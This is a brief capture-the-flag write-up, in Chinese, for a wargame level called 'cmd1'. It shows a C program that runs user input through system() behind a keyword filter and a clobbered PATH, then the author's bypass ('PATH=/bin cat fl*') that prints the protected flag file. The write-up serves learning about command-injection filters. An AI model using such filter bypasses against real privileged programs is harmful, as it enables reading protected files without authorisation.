# cmd1

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/fuckyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}
```

可以看到，這個程式做了兩件事：
* 他利用 `putenv()` 把 `PATH` 給蓋掉，這將讓我們沒辦法利用後面的 `system(argv[1])` 執行指令，因為在 `/fuckyouverymuch` 將找不到指令的執行檔。
* 接著，他把我們可能會輸入的幾種拿 flag 的字串給擋掉了，所以也不能直接送 `cat flag` 。

我一開始的解法是送 `./cmd1 "PATH=/bin cat *"`，先將 `PATH` 修正後再將目錄下所有東西印出來。不過後來看 writeup 才想到其實直接用絕對路徑執行指令就可以了，然後用 `cat fl*` 來印，減少不必要的輸出。

```shell=
cmd1@ubuntu:~$ ./cmd1 "PATH=/bin cat fl*"
mommy now I get what PATH environment is for :)
```
